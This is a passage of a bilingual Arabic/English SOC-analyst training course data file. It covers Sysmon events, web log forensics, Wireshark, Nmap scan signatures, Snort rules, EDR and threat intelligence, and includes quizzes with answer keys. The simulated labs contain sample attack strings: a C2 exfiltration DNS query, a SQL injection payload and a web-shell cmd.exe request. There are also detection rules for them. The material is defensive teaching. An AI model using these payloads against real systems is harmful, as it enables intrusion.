          questionAr: "ما هو رقم حدث الأمان (Event ID) الذي ينطلق في سجل Security عندما يحاول مهاجم مسح وتنظيف السجلات الجنائية للتغطية على آثاره؟",
          questionEn: "Which Event ID is triggered when the security audit log is cleared?",
          optionsAr: [
            "Event ID 1102 (The audit log was cleared)",
            "Event ID 4624 (Successful logon)",
            "Event ID 500 (Internal Server Error)",
            "Event ID 1 (Process Created)"
          ],
          optionsEn: [
            "Event ID 1102 (The audit log was cleared)",
            "Event ID 4624 (Successful logon)",
            "Event ID 500 (Internal Server Error)",
            "Event ID 1 (Process Created)"
          ],
          correctIndex: 0,
          explanationAr: "يعتبر الحدث Event ID 1102 من أعلى الأحداث أولوية في الـ SOC؛ فمسح سجل الأمان سلوك مريب للغاية لا يقوم به إلا مهاجم يحاول مسح الأدلة الجنائية على اختراقه."
        }
      },
      {
        id: "lesson-6-4",
        courseId: "course-6",
        number: "6.4",
        titleAr: "الإتقان الكامل لأداة Sysmon: شرح وتفصيل أهم الأحداث (ID 1, 3, 7, 8, 10, 11, 12/13, 15, 22 DNS)",
        titleEn: "Sysmon Mastery: Process (1), Network (3), Drivers (7), Injection (8), LSASS (10), Files (11) & DNS (22)",
        duration: "55 min",
        theoryAr: `
<h3>المجهر الخارق لويندوز: أداة System Monitor (Sysmon) من باقة Sysinternals</h3>
<p class="lead">سجلات ويندوز الافتراضية جيدة ولكنها فقيرة في التفاصيل السلوكية؛ هنا تأتي أداة <strong>Sysmon</strong> التي طورتها مايكروسوفت لتكون بمثابة نظام EDR مجاني فائق القوة يسجل أدق الأنشطة الخبيثة في سجل <code>Microsoft-Windows-Sysmon/Operational</code>.</p>

<h4>أهم أحداث Sysmon التي يجب أن يحفظها كل مهندس اكتشاف في الـ SOC:</h4>
<ul>
  <li><strong>Event ID 1 (Process Create):</strong> يسجل كل تفاصيل تشغيل العمليات (الهاش الكامل SHA256 للملف، سطر الأوامر، مسار المجلد الحالي، العملية الأب مع سطر أوامرها، والتوقيع الرقمي للملف).</li>
  <li><strong>Event ID 3 (Network Connection):</strong> يسجل كل اتصال شبكي خارجي أو داخلي ينشئه أي برنامج مع رقم الـ PID واسم البرنامج والعنوان والمنفذ واسم النطاق.</li>
  <li><strong>Event ID 7 (Image Loaded):</strong> يسجل تحميل أي ملف مكتبة برمجية (DLL) في الذاكرة (يكشف هجمات DLL Sideloading).</li>
  <li><strong>Event ID 8 (CreateRemoteThread):</strong> حدث فائق الخطورة؛ يظهر عندما تقوم عملية بحقن وتشغيل خيط برمجي خبيث داخل ذاكرة عملية أخرى شرعية (Process Injection).</li>
  <li><strong>Event ID 10 (ProcessAccess - LSASS Target):</strong> يرصد قيام أي برنامج بالوصول وقراءة ذاكرة عملية <code>lsass.exe</code> بصلاحيات <code>0x1010</code> أو <code>0x1FFFFF</code> (البصمة القاطعة لأداة سرقة كلمات المرور Mimikatz).</li>
  <li><strong>Event ID 11 (FileCreate):</strong> يسجل لحظة إنشاء أي ملف على القرص الصلب وتوقيته الدقيق.</li>
  <li><strong>Event ID 12 / 13 (Registry Event):</strong> يسجل إنشاء أو تعديل أو حذف أي مفتاح وقيمة في الريجستري (يكشف تثبيت برمجيات البقاء).</li>
  <li><strong>Event ID 15 (FileCreateStreamHash):</strong> يسجل تدفقات البيانات البديلة NTFS ADS ومؤشر الويب (Zone.Identifier - Mark of the Web) للملفات المنزلة من الإنترنت.</li>
  <li><strong>Event ID 22 (DNSEvent):</strong> السجل الذهبي؛ يسجل كل استعلام DNS نفذته أي عملية على الحاسوب مع اسم العملية الدقيقة المسؤولة عن الاستعلام!</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي تحليل أحداث Sysmon (Sysmon Telemetry Lab)</span>
    <h4>رصد استعلام DNS خبيث وربطه بالعملية المسؤولة عبر Sysmon ID 22</h4>
  </div>
  <p>تفحص تفاصيل حدث استعلام الـ DNS في Sysmon:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> sysmon-event-22</div>
    <pre class="terminal-code">Log: Microsoft-Windows-Sysmon/Operational | Event ID: 22 (DNSEvent)
RuleName: technique_id=T1071.004,technique_name=DNS
UtcTime: 2026-11-07 05:40:12.180
ProcessId: 4920
Image: C:\Users\Finance\AppData\Local\Temp\invoice.exe  <-- PROCESS RESPONSIBLE FOR QUERY!
QueryName: exfil-data-chunk.c2-attacker.ru           <-- MALICIOUS C2 DOMAIN!
QueryResults: 194.135.211.9
[CRITICAL ALERT] Untrusted executable in Temp spawned outbound DNS query to known C2 server!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "في أداة Sysmon، ما هو الحدث الذي يعد العلامة القاطعة لكشف محاولات سرقة كلمات المرور وتفريغ ذاكرة عملية `lsass.exe` بواسطة أداة Mimikatz؟",
          questionEn: "Which Sysmon Event ID detects LSASS memory dumping by Mimikatz?",
          optionsAr: [
            "Sysmon Event ID 10 (ProcessAccess مستهدفاً lsass.exe)",
            "Sysmon Event ID 3 (Network Connection)",
            "Sysmon Event ID 11 (File Create)",
            "Sysmon Event ID 22 (DNS Event)"
          ],
          optionsEn: [
            "Sysmon Event ID 10 (ProcessAccess targeting lsass.exe)",
            "Sysmon Event ID 3 (Network Connection)",
            "Sysmon Event ID 11 (File Create)",
            "Sysmon Event ID 22 (DNS Event)"
          ],
          correctIndex: 0,
          explanationAr: "يسجل Sysmon Event ID 10 تفاصيل وصول عملية لعملية أخرى؛ وظهور استدعاء لعملية lsass.exe بصلاحيات قراءة الذاكرة من عملية غير موثوقة هو التوقيع الكلاسيكي لهجوم تفريغ بيانات الاعتماد."
        }
      },
      {
        id: "lesson-6-5",
        courseId: "course-6",
        number: "6.5",
        titleAr: "تحليل سجلات Linux (/var/log/auth.log, syslog, secure, auditd) وسجلات سيرفرات الويب (Apache/Nginx/IIS Access & Error Logs)",
        titleEn: "Linux & Web Server Log Forensics: Apache, Nginx, IIS Access/Error & auditd",
        duration: "50 min",
        theoryAr: `
<h3>التحقيق الميداني في خوادم الويب والأنظمة المفتوحة</h3>
<p class="lead">سجلات الويب تمثل خريطة الطريق التي سلكها المهاجم لاختراق السيرفر. يتعلم محلل الـ SOC في هذا الدرس الصيغة المعيارية لسجلات الدخول المشتركة (Combined Log Format) وكيف يستنبط منها نجاح الهجوم أو فشله.</p>

<h4>بنية سطر سجل الويب القياسي (Common Log Format):</h4>
<pre><code class="language-text">198.51.100.12 - frank [07/Nov/2026:06:12:00 +0000] "GET /admin/dashboard.php HTTP/1.1" 200 4502 "http://google.com" "Mozilla/5.0..."</code></pre>
<ul>
  <li><code>198.51.100.12:</code> عنوان IP للعميل المهاجم.</li>
  <li><code>frank:</code> اسم المستخدم الموثق (إذا كان مسجل دخول).</li>
  <li><code>[07/Nov/2026:06:12:00 +0000]:</code> التوقيت المعياري مع فارق المنطقة الزمنية.</li>
  <li><code>"GET /admin/dashboard.php HTTP/1.1":</code> طريقة الطلب، المسار المطلوب، وإصدار البروتوكول.</li>
  <li><code>200:</code> كود الحالة (HTTP Status Code)؛ يحدد هل نجح الطلب (200) أم فشل (403/404).</li>
  <li><code>4502:</code> حجم البيانات المسترجعة بالبايت؛ قفزة الحجم المفاجئة تدل على تسريب قاعدة بيانات!</li>
  <li><code>"Mozilla/5.0...":</code> ترويسة المتصفح (User-Agent).</li>
</ul>

<h4>أهم سجلات الأخطاء (Error Logs):</h4>
<p>تسجل محاولات استغلال الثغرات البرمجية والانهيارات؛ ظهور أخطاء قواعد البيانات مثل <code>syntax error in SQL statement</code> في سجل أخطاء الويب دليل مؤكد على هجوم SQL Injection نشط.</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فحص سجلات الأخطاء (Web Error Log Forensics)</span>
    <h4>اكتشاف انهيار استعلام SQL بسبب حقن خبيث</h4>
  </div>
  <p>تفحص سطر سجل الخطأ في Apache Error Log:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> web-error-log</div>
    <pre class="terminal-code">[Sat Nov 07 06:14:10.829102 2026] [php7:error] [pid 1420] [client 198.51.100.12:54120]
PHP Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''admin'' OR '1'='1''' at line 1 in /var/www/html/login.php:24
[CRITICAL ALERT] Database Syntax Failure: Active SQL Injection payload confirmed in application logs!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "في سجلات خادم الويب (Access Log)، ما الذي يدل عليه زيادة مفاجئة هائلة في حقل حجم البيانات المرسلة (Response Bytes) من 200 بايت إلى 85,000,000 بايت استجابة لطلب GET غير مألوف؟",
          questionEn: "What does a massive jump in response bytes indicate in web logs?",
          optionsAr: [
            "تسريب وسرقة قاعدة بيانات ضخمة أو ملفات سرية استجابة لاستغلال ناجح (Data Exfiltration)",
            "المستخدم قام بتغيير لغة الموقع للغة العربية",
            "السيرفر قام بتنظيف الذاكرة المؤقتة",
            "انقطاع اتصال الفأرة بالحاسوب"
          ],
          optionsEn: [
            "Massive data exfiltration following successful exploit",
            "Language changed to Arabic",
            "Cache cleared",
            "Mouse disconnected"
          ],
          correctIndex: 0,
          explanationAr: "قفزة حجم البيانات المسترجعة (Bytes Sent) من بضع بايتات إلى عشرات الميجابايتات تعني أن الخادم استجاب للطلب وأفرغ ملفاً ضخماً أو محتويات جدول قاعدة بيانات كاملة للمهاجم."
        }
      },
      {
        id: "lesson-6-6",
        courseId: "course-6",
        number: "6.6",
        titleAr: "إتقان Wireshark من الصفر إلى الاحتراف: فلاتر العرض المتقدمة، تتبع التدفقات (Follow TCP/HTTP Stream)، واستخراج الملفات والبرمجيات الخبيثة من ملفات PCAP",
        titleEn: "Wireshark Network Forensics: Display Filters, Following TCP Streams & Extracting Malware from PCAP",
        duration: "55 min",
        theoryAr: `
<h3>أشعة إكس للشبكة: التشريح الكامل للحزم عبر برنامج Wireshark</h3>
<p class="lead">برنامج Wireshark هو الأداة الأكثر شهرة وقوة في العالم لالتقاط وتحليل حزم الشبكة (Packet Analysis). في تحقيقات الـ SOC، يُسلم المحلل ملفات التقاط حزم بصيغة <code>.pcap</code> أو <code>.pcapng</code> لاستخراج الأدلة القاطعة.</p>

<h4>أهم فلاتر العرض الاحترافية لمحلل الـ SOC (Wireshark Display Filters):</h4>
<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>فلتر العرض</th>
        <th>الوظيفة والهدف الأمني</th>
      </tr>
    </thead>
    <tbody>
      <tr><td><code>ip.addr == 198.51.100.44</code></td><td>عرض كل الحزم الصادرة أو الواردة من هذا العنوان المشبوه.</td></tr>
      <tr><td><code>tcp.port == 445</code></td><td>تصفية حزم مشاركة الملفات SMB لرصد هجمات WannaCry أو PsExec.</td></tr>
      <tr><td><code>http.request.method == "POST"</code></td><td>عرض طلبات الويب التي ترسل بيانات حساسة أو ترفع ملفات.</td></tr>
      <tr><td><code>dns.flags.response == 0</code></td><td>عرض استعلامات الـ DNS الصادرة فقط (مفيد لرصد DGA و Tunneling).</td></tr>
      <tr><td><code>tcp.flags.reset == 1 && tcp.flags.ack == 1</code></td><td>عرض اتصالات الرفض وقطع الجلسات (مفيد لرصد فحص المنافذ المغلقة).</td></tr>
      <tr><td><code>frame contains "password"</code></td><td>البحث في الحمولات الخام عن النصوص الصريحة لكلمات المرور.</td></tr>
    </tbody>
  </table>
</div>

<h4>ميزتان ساحرتان في Wireshark لمحلل الـ SOC:</h4>
<ul>
  <li><strong>تتبع تدفق الجلسة (Follow TCP / HTTP Stream):</strong> بالنقر بالزر الأيمن واختيار Follow Stream، يجمع Wireshark كل الحزم المشتتة ويعرض المحادثة الكاملة كنص مقروء كأنك تقرأ محادثة واتساب بين العميل والخادم!</li>
  <li><strong>استخراج الملفات المنقولة (Export Objects):</strong> من قائمة <code>File -> Export Objects -> HTTP / SMB</code>، يستطيع المحلل استخراج وحفظ الملفات التنفيذية أو الفيروسات التي تم تنزيلها أثناء الجلسة لتحليلها وعزلها!</li>
</ul>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي فلاتر Wireshark (Wireshark Filter Lab)</span>
    <h4>تطبيق فلاتر التصفية على جلسة التقاط PCAP مشبوهة</h4>
  </div>
  <p>شاهد تطبيق فلتر استخراج طلبات HTTP POST:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> tshark-cli-filter</div>
    <pre class="terminal-code">$ tshark -r capture.pcap -Y 'http.request.method == "POST"' -T fields -e ip.src -e ip.dst -e http.request.uri
10.0.0.15     194.87.12.9     /gateway/upload.php  <-- SUSPICIOUS OUTBOUND UPLOAD!
10.0.0.84     10.0.0.2        /api/login.php
[ANALYSIS] Outbound HTTP POST to external IP 194.87.12.9 identified transferring 4.2 MB of data.</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('tshark -r capture.pcap -Y \"dns\" | head -n 5', 'standalone-term-body'); app.showToast('تم فحص حزم الـ DNS في الـ PCAP', 'info');">فحص حزم DNS عبر tshark</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "في برنامج Wireshark، ما هي الميزة السريعة التي تتيح لمحلل الـ SOC استخراج ملف تنفيذي خبيث تم تنزيله عبر الشبكة من جلسة التقاط PCAP دون الحاجة لكتابة أوامر برمجية؟",
          questionEn: "Which Wireshark feature exports downloaded malicious files from a PCAP?",
          optionsAr: [
            "خيار Export Objects من قائمة File (مثل Export Objects -> HTTP)",
            "خيار Print Setup",
            "خيار Format Drive",
            "خيار Change Font Size"
          ],
          optionsEn: [
            "File -> Export Objects (e.g., Export Objects -> HTTP)",
            "Print Setup",
            "Format Drive",
            "Change Font Size"
          ],
          correctIndex: 0,
          explanationAr: "تتيح ميزة Export Objects في Wireshark إعادة بناء الملفات المنقولة في تدفقات HTTP أو SMB وحفظها كملفات حقيقية على القرص لفحص هاشاتها ومحتواها الجنائي."
        }
      },
      {
        id: "lesson-6-7",
        courseId: "course-6",
        number: "6.7",
        titleAr: "اكتشاف الهجمات الشبكية داخل Wireshark: شكل فحص Nmap (SYN Scan, Connect Scan, Xmas Scan)، وهجمات ARP Poisoning و Brute Force",
        titleEn: "Hunting Network Attacks in Wireshark: Nmap Scans (SYN, Connect, Xmas), ARP Poisoning & Brute-Force",
        duration: "55 min",
        theoryAr: `
<h3>بصمات الهجمات الشبكية: كيف تبدو أسلحة القراصنة تحت المجهر؟</h3>
<p class="lead">لكل أداة هجوم بصمة شبكية محددة في طريقة ترتيب الحزم والأعلام؛ يستطيع المحلل المتمكن بمجرد النظر في نافذة الحزم أن يقول: <em>"هذا فحص Nmap خفي، وهذا تسميم ARP!"</em>.</p>

<h4>1. بصمات أنواع فحص Nmap الثلاثة في Wireshark:</h4>
<ul>
  <li><strong>فحص النصف مصافحة الخفي (SYN Stealth Scan - <code>nmap -sS</code>):</strong>
    <ul>
      <li>يرسل المهاجم حزمة [SYN].</li>
      <li>إذا رد الهدف بـ [SYN, ACK]، يرسل المهاجم فوراً حزمة [RST] لإسقاط الجلسة دون إرسال [ACK] نهائياً!</li>
      <li>في Wireshark: سترى آلاف أزواج <code>SYN -> SYN-ACK -> RST</code> في فترات زمنية متقاربة جداً.</li>
    </ul>
  </li>
  <li><strong>فحص الاتصال الكامل (TCP Connect Scan - <code>nmap -sT</code>):</strong>
    <ul>
      <li>يكمل المصافحة الثلاثية كاملة: <code>SYN -> SYN-ACK -> ACK</code>، ثم ينهيها فوراً بحزمة <code>RST</code>.</li>
    </ul>
  </li>
  <li><strong>فحص شجرة عيد الميلاد (Xmas Scan - <code>nmap -sX</code>):</strong>
    <ul>
      <li>فحص شاذ يضيء أعلام الحزمة كأنها شجرة عيد ميلاد! يرسل حزم TCP مضاء فيها ثلاثة أعلام متناقضة معاً: <code>[FIN, PSH, URG]</code> دون أي حزمة SYN سابقة! لا يمكن لأي تطبيق شرعي في العالم إرسال هذا النمط الشاذ.</li>
    </ul>
  </li>
</ul>

<h4>2. بصمة هجوم تسميم الـ ARP (ARP Poisoning):</h4>
<p>ظهور مئات رسائل <code>ARP Reply</code> كاذبة غير مسبوقة بـ <code>ARP Request</code> (تسمى Gratuitous ARP)، مع رصد تنبيه Wireshark الشهير باللون الأصفر: <code>Duplicate IP address detected for 192.168.1.1</code>.</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي كشف فحص Xmas Scan في Wireshark</span>
    <h4>رصد الحزم الشاذة ذات الأعلام FIN, PSH, URG المتزامنة</h4>
  </div>
  <p>شاهد تصفية الحزم باستخدام فلتر مطابقة الأعلام الشاذة:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> xmas-scan-hunter</div>
    <pre class="terminal-code">Wireshark Filter: tcp.flags.fin==1 && tcp.flags.push==1 && tcp.flags.urg==1
Packet #  Time      Source IP      Dest IP        Protocol Info
1042      0.14120   192.168.1.105  192.168.1.50   TCP      54102 -> 21 [FIN, PSH, URG] Seq=0
1043      0.14122   192.168.1.105  192.168.1.50   TCP      54102 -> 22 [FIN, PSH, URG] Seq=0
1044      0.14124   192.168.1.105  192.168.1.50   TCP      54102 -> 80 [FIN, PSH, URG] Seq=0
[CRITICAL ALERT] Nmap Xmas Scan signature confirmed across target ports 21, 22, 80!</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "في فحص Nmap Xmas Scan (`-sX`)، ما هي الأعلام الثلاثة التي تفعلها الأداة معاً في حزمة TCP لتجاوز الجدران النارية البسيطة؟",
          questionEn: "Which three flags are set simultaneously in an Nmap Xmas Scan?",
          optionsAr: [
            "أعلام: FIN, PSH, URG",
            "أعلام: SYN, ACK, RST",
            "أعلام: DNS, HTTP, FTP",
            "أعلام: START, STOP, PAUSE"
          ],
          optionsEn: [
            "FIN, PSH, URG",
            "SYN, ACK, RST",
            "DNS, HTTP, FTP",
            "START, STOP, PAUSE"
          ],
          correctIndex: 0,
          explanationAr: "سُمي فحص Xmas بهذا الاسم لأن تفعيل أعلام FIN و PSH و URG معاً يجعل الحزمة تبدو كشجرة عيد ميلاد مضاءة؛ ولا يوجد أي بروتوكول اتصال شرعي يستخدم هذا المزيج من الأعلام."
        }
      },
      {
        id: "lesson-6-8",
        courseId: "course-6",
        number: "6.8",
        titleAr: "أنظمة كشف ومنع التطفل (Snort, Suricata & Zeek): كيف تقرأ وتكتب قواعد Snort/Suricata Rules بالتفصيل الممل",
        titleEn: "Network IDS/IPS Mastery: Snort, Suricata & Zeek Architecture with Custom Rule Writing",
        duration: "55 min",
        theoryAr: `
<h3>حراس البوابات الرقمية: لغة كتابة قواعد كشف التسلل في الشبكات</h3>
<p class="lead">أنظمة IDS/IPS تفحص تيار الحزم العابر في الشبكة لحظة بلحظة؛ تعد محركات <strong>Snort</strong> و <strong>Suricata</strong> المعيار العالمي لقواعد التوقيعات (Signature-Based Detection)، بينما يتفوق <strong>Zeek (Bro)</strong> في التحليل السلوكي وتحويل حركة الشبكة إلى سجلات أمنية غنية.</p>

<h4>التشريح الهندسي لقاعدة Snort / Suricata:</h4>
<pre><code class="language-text">alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"ATTACK - SQLi Attempt detected"; content:"UNION SELECT"; nocase; sid:1000001; rev:1;)</code></pre>

<p>تتكون أي قاعدة من جزأين رئيسيين:</p>
<ol>
  <li><strong>ترويسة القاعدة (Rule Header):</strong>
    <ul>
      <li><strong>Action:</strong> الإجراء (مثل: <code>alert</code> لإطلاق تنبيه، أو <code>drop</code> لحظر الحزمة فوراً في الـ IPS).</li>
      <li><strong>Protocol:</strong> البروتوكول (<code>tcp</code>, <code>udp</code>, <code>icmp</code>, <code>http</code>).</li>
      <li><strong>Source IP & Port:</strong> المصدر (<code>$EXTERNAL_NET any</code> تعني أي عنوان ومنفذ خارجي).</li>
      <li><strong>Direction Operator:</strong> اتجاه الحركة (<code>-></code> باتجاه السيرفر، أو <code>&lt;></code> ثنائي الاتجاه).</li>
      <li><strong>Dest IP & Port:</strong> الهدف (<code>$HOME_NET 80</code> تعني سيرفرات الويب بالشبكة الداخلية).</li>
    </ul>
  </li>
  <li><strong>خيارات وفلاتر التفتيش (Rule Options):</strong>
    <ul>
      <li><code>msg:</code> النص التوضيحي الذي يظهر لمحلل الـ SOC في التنبيه.</li>
      <li><code>content:</code> النص المطلوب مطابقته والبحث عنه داخل حمولة الحزمة (Payload).</li>
      <li><code>nocase:</code> مطابقة النص بغض النظر عن حالة الأحرف كبيرة أو صغيرة (Case-insensitive).</li>
      <li><code>sid (Signature ID):</strong> المعرف الرقمي الفريد للقاعدة (الأرقام فوق 1,000,000 مخصصة للقواعد المخصصة محلياً).</li>
      <li><code>rev:</code> رقم إصدار القاعدة.</li>
    </ul>
  </li>
</ol>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي محرك قواعد Snort (Snort Rule Engine Simulator)</span>
    <h4>كتابة واختبار قاعدة Snort لكشف استدعاء ملف cmd.exe عبر الويب</h4>
  </div>
  <p>شاهد مطابقة القاعدة المكتوبة لحزمة خبيثة مارة في الشبكة:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> snort-rule-tester</div>
    <pre class="terminal-code">RULE: alert tcp any any -> any 80 (msg:"EXPLOIT - Web Shell cmd.exe execution"; content:"cmd.exe"; nocase; sid:1000042; rev:1;)
TESTING PACKET: GET /uploads/shell.php?exec=cmd.exe /c whoami HTTP/1.1
RESULT: MATCH FOUND!
TRIGGERED ALERT: [**] [1:1000042:1] EXPLOIT - Web Shell cmd.exe execution [**] [Priority: 1] {TCP} 198.51.100.15:51204 -> 10.0.0.12:80</pre>
  </div>
</div>
`,
        quiz: {
          questionAr: "في قواعد كشف التسلل لنظام Snort/Suricata، ما هو المعدل (Modifier) الذي يوضع بعد خيار `content:\"admin\";` لضمان مطابقة الكلمة حتى لو كتبها المهاجم بحروف كبيرة مثل `ADMIN` أو `Admin`؟",
          questionEn: "Which modifier ensures case-insensitive matching in Snort rules?",
          optionsAr: [
            "`nocase;`",
            "`case-sensitive;`",
            "`ignore;`",
            "`lowercase;`"
          ],
          optionsEn: [
            "nocase;",
            "case-sensitive;",
            "ignore;",
            "lowercase;"
          ],
          correctIndex: 0,
          explanationAr: "المعدل `nocase;` يخبر محرك التفتيش بمطابقة النص بغض النظر عن حالة الأحرف (Case-Insensitive) لتفادي تهرب المهاجمين بتغيير حجم الحروف."
        }
      },
      {
        id: "lesson-6-9",
        courseId: "course-6",
        number: "6.9",
        titleAr: "أمن النقاط الطرفية (EDR vs Antivirus vs XDR): كيف يعمل الـ EDR؟ قراءة شجرة العمليات (Process Lineage)، وكشف حقن الذاكرة (Process Injection)",
        titleEn: "Endpoint Security Evolution: Antivirus vs EDR vs XDR, Process Lineage & Memory Injection",
        duration: "55 min",
        theoryAr: `
<h3>تطور حماية الأجهزة: من مجرد مطابقة التوقيعات إلى المراقبة السلوكية التفاعلية</h3>
<p class="lead">انتهى عصر مكافحة الفيروسات التقليدي (Traditional AV) الذي يعتمد فقط على مطابقة هاشات الملفات المعروفة؛ فبرمجيات اليوم تولد هاشاً جديداً في كل ثانية وتعمل مباشرة في الذاكرة دون كتابة ملفات. هنا تبرز أنظمة الاستجابة المتقدمة للنقاط الطرفية (EDR).</p>

<h4>1. المقارنة الثلاثية: Antivirus vs EDR vs XDR</h4>
<ul>
  <li><strong>برنامج مكافحة الفيروسات التقليدي (Antivirus):</strong> يعتمد على التوقيعات (Signature-based)؛ يفحص الملف عند كتابته على القرص فقط. إذا غير المهاجم بايت واحد في الملف، يفشل الـ AV تماماً في كشفه!</li>
  <li><strong>نظام الـ EDR (Endpoint Detection and Response):</strong> يراقب <strong>السلوك (Behavior-based)</strong> باستمرار؛ يسجل شجرة العمليات، الاتصالات الشبكية، استدعاءات الذاكرة، ويسمح للمحلل بعزل الحاسوب عن بُعد وفتح جلسة طرفية حية (Live Response Terminal) عليه.</li>
  <li><strong>نظام الـ XDR (Extended Detection and Response):</strong> يدمج قياسات الـ EDR مع سجلات الشبكة والسحابة والبريد في منصة واحدة موحدة.</li>
</ul>

<h4>2. قراءة شجرة العمليات (Process Lineage & Tree Analysis)</h4>
<p>أقوى أدوات محلل الـ EDR؛ توضح العلاقة العائلية (الجد -> الأب -> الابن). أي عملية يجب أن تتسق مع وظيفتها الطبيعية:</p>
<pre><code class="language-text"># شجرة عمليات خبيثة نموذجية (Malicious Lineage):
outlook.exe (الأب الأكبر - برنامج البريد)
 └─> winword.exe (الأب - مستند وورد يحتوي ماكرو)
      └─> cmd.exe (الابن - سطر أوامر أطلقه الماكرو)
           └─> powershell.exe (الحفيد - تشغيل سكريبت تنزيل الـ C2)</code></pre>

<h4>3. كشف حقن الذاكرة (Process Injection Techniques)</h4>
<p>تقوم البرمجية الخبيثة بفتح عملية نظام شرعية وموثوقة (مثل <code>svchost.exe</code> أو <code>notepad.exe</code>) وحقن الكود الخبيث في مساحتها العشوائية بالذاكرة عبر دوال Win32 APIs مثل: <code>OpenProcess</code> ثم <code>VirtualAllocEx</code> ثم <code>WriteProcessMemory</code> ثم <code>CreateRemoteThread</code>!</p>
`,
        labAr: `
<div class="lab-box">
  <div class="lab-header">
    <span class="lab-tag">💻 محاكي لوحة تحكم الـ EDR (EDR Console Simulation)</span>
    <h4>فحص شجرة عمليات مشبوهة وتطبيق إجراء العزل الشبكي الفوري</h4>
  </div>
  <p>شاهد تنبيه الـ EDR وسلوك حقن الذاكرة المكتشف:</p>
  <div class="terminal-mini">
    <div class="terminal-bar"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> edr-alert-viewer</div>
    <pre class="terminal-code">[EDR SEV-CRITICAL] Process Injection Detected (MITRE T1055)
Source Process: C:\Users\Finance\AppData\Local\Temp\invoice.exe (PID: 3912)
Target Process: C:\Windows\System32\explorer.exe (PID: 1404)
API Sequence: OpenProcess -> VirtualAllocEx -> WriteProcessMemory -> CreateRemoteThread
Recommended Action: HOST ISOLATION</pre>
  </div>
  <div class="lab-actions" style="margin-top: 1rem;">
    <button class="btn-cmd" onclick="runSimCommand('edr-isolate --host FIN-PC-02', 'standalone-term-body'); app.showToast('تم عزل الجهاز المصاب عن الشبكة فوراً عبر EDR', 'success');">عزل الجهاز المصاب شبكياً: Isolate Host</button>
  </div>
</div>
`,
        quiz: {
          questionAr: "في تحقيقات الـ EDR، لماذا يعد انطلاق عملية سطر الأوامر `cmd.exe` أو `powershell.exe` من تطبيق مثل `winword.exe` (Microsoft Word) مؤشراً قاطعاً على نشاط خبيث؟",
          questionEn: "Why is Word spawning cmd.exe a definitive sign of malicious activity?",
          optionsAr: [
            "لأن برامج الأوفيس المكتبية العادية لا تفتح موجه الأوامر تلقائياً؛ وظهور ذلك يدل على استغلال ماكرو خبيث لتنفيذ أوامر برمجية (Malicious Macro Execution)",
            "لأن برنامج الوورد يحتاج إلى موجه الأوامر لحفظ ملفات النصوص",
            "لأن الطابعة لا تعمل بدون باور شيل",
            "لأن نظام ويندوز يقوم بتحديث الخطوط"
          ],
          optionsEn: [
            "Office apps do not naturally spawn shells; it indicates malicious macro execution attempting shell breakout",
            "Word needs cmd to save text",
            "Printers require powershell",
            "Windows updating fonts"
          ],
          correctIndex: 0,
          explanationAr: "في الوضع الطبيعي، لا يقوم محرر النصوص Microsoft Word بإطلاق سطر أوامر النظام؛ وانطلاق قذيفة كـ cmd أو PowerShell منه دليل مؤكد على ماكرو خبيث أو استغلال لثغرة أمنية."
        }
      },
      {
        id: "lesson-6-10",
        courseId: "course-6",
        number: "6.10",
        titleAr: "استخبارات التهديدات المفتوحة (OSINT & Threat Intel): هرم الألم (Pyramid of Pain)، وقواعد الـ OPSEC عند فحص الـ IOCs في (VirusTotal, AbuseIPDB, URLScan.io, Any.Run, Shodan, Talos)",
        titleEn: "OSINT & Threat Intelligence: The Pyramid of Pain & OPSEC-Safe IOC Investigation",
        duration: "55 min",
        theoryAr: `
<h3>الاستخبارات الدفاعية: هرم الألم وقواعد التحقيق الآمن دون حرق العملية</h3>
<p class="lead">استخبارات التهديدات السيبرانية (Cyber Threat Intelligence - CTI) هي علم جمع وتحليل المؤشرات والأنماط التي يستخدمها المهاجمون لتحويل الدفاع إلى استباقية. لفهم مدى صعوبة وتأثير كل مؤشر أمني، وضع الخبير David Bianco هرم الألم الشهير.</p>

<h4>هرم الألم لمحلل الـ SOC (David Bianco's Pyramid of Pain):</h4>
<div class="table-responsive">
  <table class="cyber-table">
    <thead>
      <tr>
        <th>طبقة الهرم</th>
        <th>المؤشر (Indicator)</th>
        <th>مدى سهولة تغييره من قبل المهاجم</th>
        <th>مقدار الألم الذي تسببه للمهاجم عند حظره</th>
      </tr>
    </thead>
    <tbody>
      <tr><td><strong>قاعدة الهرم</strong></td><td>هاشات الملفات (Hash Values - MD5, SHA256)</td><td>سهل جداً (Trivial)؛ تغيير بايت واحد في الملف يغير الهاش فوراً.</td><td>ألم صفري؛ يغيره المهاجم في ثوانٍ.</td></tr>
      <tr><td><strong>الطبقة 2</strong></td><td>عناوين الـ IP (IP Addresses)</td><td>بسيط (Easy)؛ استئجار سيرفر جديد بدولار واحد.</td><td>ألم بسيط ومؤقت.</td></tr>
